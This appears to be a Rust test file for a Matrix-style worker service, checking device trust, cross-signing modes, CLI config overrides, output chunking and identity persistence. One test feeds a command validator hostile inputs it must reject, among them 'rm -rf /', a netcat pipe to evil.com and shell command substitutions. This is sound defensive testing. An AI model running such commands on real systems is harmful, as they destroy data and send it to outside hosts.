use mxdx_types::config::CrossSigningMode;
use mxdx_types::events::session::OutputStream;
use mxdx_types::identity::{InMemoryKeychain, KeychainBackend};
use mxdx_types::trust::TrustedDevice;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn make_device(id: &str) -> TrustedDevice {
    TrustedDevice {
        device_id: id.into(),
        user_id: "@worker:example.com".into(),
        ed25519_key: format!("ed25519_key_{id}"),
        cross_signed_at: 1700000000,
    }
}

// ---------------------------------------------------------------------------
// Test 6: Worker rejects task from untrusted device
// ---------------------------------------------------------------------------

#[test]
fn worker_rejects_untrusted_device() {
    let keychain = Box::new(InMemoryKeychain::new());
    let trust = mxdx_worker::trust::WorkerTrust::load_or_create(
        keychain,
        "@worker:example.com",
        "@admin:example.com",
    )
    .unwrap();

    // Device "evil-device" is not trusted
    assert!(!trust.is_device_trusted("evil-device"));
}

// ---------------------------------------------------------------------------
// Test 7: Trust bootstrap -- worker trusts anchor's devices in Auto mode
// ---------------------------------------------------------------------------

#[test]
fn trust_bootstrap_auto_mode() {
    let keychain = Box::new(InMemoryKeychain::new());
    let mut trust = mxdx_worker::trust::WorkerTrust::load_or_create(
        keychain,
        "@worker:example.com",
        "@admin:example.com",
    )
    .unwrap();

    let devices = vec![make_device("DEV-A"), make_device("DEV-B")];
    trust
        .merge_trust_list(devices, CrossSigningMode::Auto)
        .unwrap();

    assert!(trust.is_device_trusted("DEV-A"));
    assert!(trust.is_device_trusted("DEV-B"));
}

// ---------------------------------------------------------------------------
// Test 8: Manual cross-signing mode blocks automatic trust
// ---------------------------------------------------------------------------

#[test]
fn manual_mode_blocks_automatic_trust() {
    let keychain = Box::new(InMemoryKeychain::new());
    let mut trust = mxdx_worker::trust::WorkerTrust::load_or_create(
        keychain,
        "@worker:example.com",
        "@admin:example.com",
    )
    .unwrap();

    let devices = vec![make_device("DEV-X"), make_device("DEV-Y")];
    trust
        .merge_trust_list(devices, CrossSigningMode::Manual)
        .unwrap();

    assert!(!trust.is_device_trusted("DEV-X"));
    assert!(!trust.is_device_trusted("DEV-Y"));
}

// ---------------------------------------------------------------------------
// Test 9: Config loading -- CLI args override TOML defaults
// ---------------------------------------------------------------------------

#[test]
fn cli_args_override_toml() {
    use mxdx_types::config::{DefaultsConfig, WorkerConfig};
    use mxdx_worker::config::{WorkerArgs, WorkerRuntimeConfig};

    let defaults = DefaultsConfig::default();
    let worker = WorkerConfig {
        trust_anchor: Some("@original:example.com".into()),
        history_retention: 90,
        ..Default::default()
    };
    let cfg = WorkerRuntimeConfig::from_parts(defaults, worker);

    // Apply CLI overrides
    let args = WorkerArgs {
        trust_anchor: Some("@override:example.com".into()),
        history_retention: Some(7),
        cross_signing_mode: None,
        room_name: Some("cli-room".into()),
        room_id: None,
        homeserver: None,
        username: None,
        password: None,
    };
    let cfg = cfg.with_cli_overrides(&args);

    assert_eq!(
        cfg.worker.trust_anchor,
        Some("@override:example.com".into())
    );
    assert_eq!(cfg.worker.history_retention, 7);
    assert_eq!(cfg.resolved_room_name, "cli-room");
}

// ---------------------------------------------------------------------------
// Test 10: Executor validates commands securely
// ---------------------------------------------------------------------------

#[test]
fn executor_rejects_dangerous_commands() {
    assert!(mxdx_worker::executor::validate_bin("echo").is_ok());
    assert!(mxdx_worker::executor::validate_bin("echo; rm -rf /").is_err());
    assert!(mxdx_worker::executor::validate_bin("cat|nc evil.com 1234").is_err());
    assert!(mxdx_worker::executor::validate_bin("").is_err());
    assert!(mxdx_worker::executor::validate_bin("$(whoami)").is_err());
    assert!(mxdx_worker::executor::validate_bin("`id`").is_err());
}

// ---------------------------------------------------------------------------
// Test 11: Output batching chunks large payloads
// ---------------------------------------------------------------------------

#[test]
fn output_batching_chunks_large_payloads() {
    let router = mxdx_worker::output::OutputRouter::new(false).with_batch_settings(200, 100);

    let data = vec![b'A'; 350]; // 350 bytes -> 4 chunks (100, 100, 100, 50)
    let events =
        router.create_chunked_output("sess-1", "worker-1", OutputStream::Stdout, &data);

    assert_eq!(events.len(), 4);

    // Verify sequential sequence numbers
    for (i, event) in events.iter().enumerate() {
        assert_eq!(event.seq, i as u64);
        assert_eq!(event.session_uuid, "sess-1");
        assert_eq!(event.worker_id, "worker-1");
    }
}

// ---------------------------------------------------------------------------
// Test 12: Identity persistence across reloads
// ---------------------------------------------------------------------------

#[test]
fn identity_persists_across_reloads() {
    // Pre-seed a keychain with a known device ID (simulating a previous run).
    let known_device_id = "aaaaaaaa-1111-2222-3333-bbbbbbbbbbbb";
    let device_id_key = "mxdx/@w:ex.com/device-id";

    // First load: keychain has the known device ID, so load_or_create should
    // return it unchanged.
    let kc1 = InMemoryKeychain::new();
    kc1.set(device_id_key, known_device_id.as_bytes()).unwrap();
    let id1 = mxdx_worker::identity::WorkerIdentity::load_or_create(
        Box::new(kc1),
        "@w:ex.com",
        "host",
        "user",
    )
    .unwrap();

    // Second load: seed another keychain with the same data (simulating a
    // restart that reads from the same persistent store).
    let kc2 = InMemoryKeychain::new();
    kc2.set(device_id_key, known_device_id.as_bytes()).unwrap();
    let id2 = mxdx_worker::identity::WorkerIdentity::load_or_create(
        Box::new(kc2),
        "@w:ex.com",
        "host",
        "user",
    )
    .unwrap();

    assert_eq!(id1.device_id(), id2.device_id());
    assert_eq!(id1.device_id(), known_device_id);
}
